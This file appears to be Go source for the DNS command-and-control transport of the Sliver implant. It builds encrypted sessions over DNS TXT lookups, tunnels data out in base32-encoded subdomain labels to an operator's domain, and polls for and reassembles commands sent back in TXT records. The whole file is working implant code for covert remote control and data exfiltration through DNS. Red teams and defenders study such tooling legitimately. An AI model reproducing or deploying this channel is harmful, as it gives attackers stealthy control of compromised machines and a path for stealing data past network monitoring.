package main

import (
	"bytes"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"math"

	// {{if .Debug}}
	"log"
	// {{else}}{{end}}

	insecureRand "math/rand"
	"net"
	pb "sliver/protobuf"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/golang/protobuf/proto"
)

const (
	domainKeyMsg      = "_domainkey"
	blockReqMsg       = "_b"
	clearBlockMsg     = "_cb"
	sessionMsg        = "s"
	sessionInitMsg    = "_si"
	sessionCleanupMsg = "_sc"
	sessionPollingMsg = "_sp"

	domainKeySubdomain = "_domainkey"
	nonceStdSize       = 6

	// Base 32 encoding, so (n*8 + 4) / 5 = 63 means we can encode 39 bytes - 4 bytes for seq
	byteBlockSize = 35

	blockIDSize = 6

	maxFetchTxts = 200 // How many txts to request at a time
)

var (
	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")

	pollInterval = 1 * time.Second
)

// RecvBlock - Single block from server
type RecvBlock struct {
	Index int
	Data  []byte
}

// BlockReassembler - Data is encoded and split into `Blocks`
type BlockReassembler struct {
	ID   string
	Size int
	Recv chan RecvBlock
}

// --------------------------- DNS SESSION START ---------------------------

func dnsStartSession(parentDomain string) (string, AESKey, error) {
	sessionKey := RandomAESKey()
	pubKey := dnsGetServerPublicKey()

	data, err := RSAEncrypt(sessionKey[:], pubKey)
	if err != nil {
		return "", AESKey{}, err
	}
	nonce := dnsNonce(nonceStdSize)
	encoded := base32.StdEncoding.EncodeToString(data)
	txts, err := net.LookupTXT(fmt.Sprintf("%s.%s.%s._si.%s", nonce, encoded, sliverName, parentDomain))
	if 0 < len(txts) {
		sessionID, err := GCMDecrypt(sessionKey, []byte(txts[0]))
		if err != nil {
			return "", AESKey{}, err
		}
		return string(sessionID), sessionKey, nil
	}
	return "", AESKey{}, errors.New("Invalid TXT response to session init")
}

// Get the public key of the server
func dnsGetServerPublicKey() *rsa.PublicKey {
	pubKeyPEM, err := LookupDomainKey(sliverName, dnsParent)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to fetch domain key %v", err)
		// {{end}}
		return nil
	}

	pubKeyBlock, _ := pem.Decode([]byte(pubKeyPEM))
	if pubKeyBlock == nil {
		// {{if .Debug}}
		log.Printf("failed to parse certificate PEM")
		// {{end}}
		return nil
	}

	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
	if certErr == nil {
		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
		return cert.PublicKey.(*rsa.PublicKey)
	}

	// {{if .Debug}}
	log.Printf("Invalid certificate %v", err)
	// {{end}}
	return nil
}

// LookupDomainKey - Attempt to get the server's RSA public key
func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
	selector = strings.ToLower(selector)
	nonce := dnsNonce(nonceStdSize)
	subdomain := fmt.Sprintf("_%s.%s.%s.%s", nonce, selector, domainKeySubdomain, parentDomain)
	txts, err := net.LookupTXT(subdomain)
	if err != nil {
		return nil, err
	}
	log.Printf("txts = %v err = %v", txts, err)
	if len(txts) == 0 {
		return nil, errors.New("Invalid _domainkey response")
	}

	fields := strings.Split(txts[0], ".")
	if len(fields) < 2 {
		return nil, errors.New("Invalid _domainkey response")
	}
	log.Printf("Fetching Block ID = %s (Size = %s)", fields[0], fields[1])
	return getBlock(parentDomain, fields[0], fields[1])
}

// --------------------------- DNS SESSION SEND ---------------------------
func dnsSessionSend(parentDomain string, sessionID string, sessionKey AESKey, envelope *pb.Envelope) error {
	envelopeData, _ := proto.Marshal(envelope)
	encryptedEnvelope, _ := GCMEncrypt(sessionKey, envelopeData)

	// Send message header
	size := uint32(math.Round(float64(len(encryptedEnvelope)) / float64(byteBlockSize)))
	headerID := dnsBlockHeaderID()
	dnsBlock := &pb.DNSBlockHeader{Id: headerID, Size: size}
	dnsBlockData, _ := proto.Marshal(dnsBlock)
	encryptedDNSBlock := sessionEncrypt(sessionKey, dnsBlockData)
	nonce := dnsNonce(nonceStdSize)
	txts, err := net.LookupTXT(fmt.Sprintf("%s.%s.%s._sh.%s", nonce, encryptedDNSBlock, sessionID, parentDomain))
	if err != nil {
		return err
	} else if len(txts) < 1 || txts[0] == "1" {
		return errors.New("Server rejected session message header")
	}

	// Send message body
	nonce = dnsNonce(nonceStdSize)
	encryptedHeaderID := sessionEncrypt(sessionKey, []byte(headerID))
	for sequenceNumber := uint32(0); sequenceNumber < size; sequenceNumber++ {
		buf := new(bytes.Buffer)
		binary.Write(buf, binary.LittleEndian, sequenceNumber)

		start := sequenceNumber * byteBlockSize
		stop := start + byteBlockSize
		data := append(buf.Bytes(), encryptedEnvelope[start:stop]...)

		encoded := base32.StdEncoding.EncodeToString(data)
		domain := fmt.Sprintf("%s.%s.%s.%s.s.%s", nonce, encoded, encryptedHeaderID, sessionID, parentDomain)
		txts, err := net.LookupTXT(domain)
		if err != nil {
			return err
		} else if len(txts) < 1 || txts[0] == "1" {
			return errors.New("Server rejected session message")
		}
	}
	return nil
}

// --------------------------- DNS SESSION RECV ---------------------------

func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ctrl chan bool, recv chan *pb.Envelope) {
	for {
		select {
		case <-ctrl:
			return
		default:
			nonce := dnsNonce(nonceStdSize)
			subdomain := fmt.Sprintf("_%s.%s._sp.%s", nonce, sessionID, parentDomain)
			txts, err := net.LookupTXT(subdomain)
			if err != nil || len(txts) < 1 {
				// {{if .Debug}}
				log.Printf("Error while polling session %v", err)
				// {{end}}
				break
			}
			rawTxt, _ := base64.RawStdEncoding.DecodeString(txts[0])
			pollData, err := GCMDecrypt(sessionKey, rawTxt)
			dnsPoll := &pb.DNSPoll{}
			err = proto.Unmarshal(pollData, dnsPoll)
			if err != nil {
				// {{if .Debug}}
				log.Printf("Invalid _sp response")
				// {{end}}
				break
			}

			for _, blockPtr := range dnsPoll.Blocks {
				go func(blockPtr *pb.DNSBlockHeader) {
					envelope := getSessionEnvelope(parentDomain, sessionKey, blockPtr)
					if envelope != nil {
						recv <- envelope
					}
				}(blockPtr)
			}
		}
	}
}

// Poll returned the server has a message for us, fetch the entire envelope
func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNSBlockHeader) *pb.Envelope {
	blockData, err := getBlock(parentDomain, blockPtr.Id, fmt.Sprintf("%d", blockPtr.Size))
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to fetch block with id = %s", blockPtr.Id)
		// {{end}}
		return nil
	}
	envelopeData, err := GCMDecrypt(sessionKey, blockData)
	if err != nil {
		log.Printf("Failed to decrypt block with id = %s", blockPtr.Id)
		return nil
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(envelopeData, envelope)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message %v", err)
		// {{end}}
		return nil
	}
	return envelope
}

// Perform concurrent DNS requests to fetch all blocks of data
func getBlock(parentDomain string, blockID string, size string) ([]byte, error) {
	n, err := strconv.Atoi(size)
	if err != nil {
		return nil, err
	}
	reasm := &BlockReassembler{
		ID:   blockID,
		Size: n,
		Recv: make(chan RecvBlock, n),
	}

	var wg sync.WaitGroup
	data := make([][]byte, reasm.Size)

	fetchTxts := maxFetchTxts
	if reasm.Size < maxFetchTxts {
		fetchTxts = reasm.Size
	}

	for index := 0; index < reasm.Size; index += fetchTxts {
		wg.Add(1)
		go fetchRecvBlock(parentDomain, reasm, index, index+fetchTxts, &wg)
	}
	done := make(chan bool)
	go func() {
		for block := range reasm.Recv {
			data[block.Index] = block.Data
		}
		done <- true
	}()
	wg.Wait()
	close(reasm.Recv)
	<-done // Avoid race where range of reasm.Recv isn't complete

	msg := []byte{}
	for _, buf := range data {
		msg = append(msg, buf...)
	}
	nonce := dnsNonce(nonceStdSize)
	go net.LookupTXT(fmt.Sprintf("%s.%s._cb.%s", nonce, reasm.ID, parentDomain))
	return msg, nil
}

// Fetch a single block
func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, stop int, wg *sync.WaitGroup) {
	defer wg.Done()
	nonce := dnsNonce(nonceStdSize)
	subdomain := fmt.Sprintf("_%s.%d.%d.%s._b.%s", nonce, start, stop, reasm.ID, parentDomain)
	log.Printf("[dns] fetch -> %s", subdomain)
	txts, err := net.LookupTXT(subdomain)
	log.Printf("[dns] fetched %d txt record(s)", len(txts))
	if err != nil {
		log.Printf("Failed to fetch blocks %v", err)
	}
	for _, txt := range txts {
		// Split on delim '.' because Windows strcat's multiple TXT records
		for _, record := range strings.Split(txt, ".") {
			if len(record) == 0 {
				continue
			}
			log.Printf("Decoding TXT record: %s", record)
			rawBlock, err := base64.RawStdEncoding.DecodeString(record)
			if err != nil {
				log.Printf("Failed to decode raw block '%s'", rawBlock)
				continue
			}
			if len(rawBlock) < 4 {
				log.Printf("Invalid raw block size %d", len(rawBlock))
				continue
			}
			seqBuf := make([]byte, 4)
			copy(seqBuf, rawBlock[:4])
			seq := int(binary.LittleEndian.Uint32(seqBuf))
			log.Printf("seq = %d (%d bytes)", seq, len(rawBlock[4:]))
			reasm.Recv <- RecvBlock{
				Index: seq,
				Data:  rawBlock[4:],
			}
		}
	}
}

// --------------------------- HELPERS ---------------------------

func dnsBlockHeaderID() string {
	insecureRand.Seed(time.Now().UnixNano())
	blockID := []rune{}
	for i := 0; i < blockIDSize; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		blockID = append(blockID, dnsCharSet[index])
	}
	return string(blockID)
}

// dnsNonce - Generate a nonce of a given size
func dnsNonce(size int) string {
	insecureRand.Seed(time.Now().UnixNano())
	nonce := []rune{}
	for i := 0; i < size; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		nonce = append(nonce, dnsCharSet[index])
	}
	return string(nonce)
}

// Wrapper around GCMEncrypt & Base32 encode
func sessionEncrypt(sessionKey AESKey, data []byte) string {
	encryptedData, _ := GCMEncrypt(sessionKey, data)
	return base32.StdEncoding.EncodeToString(encryptedData)
}
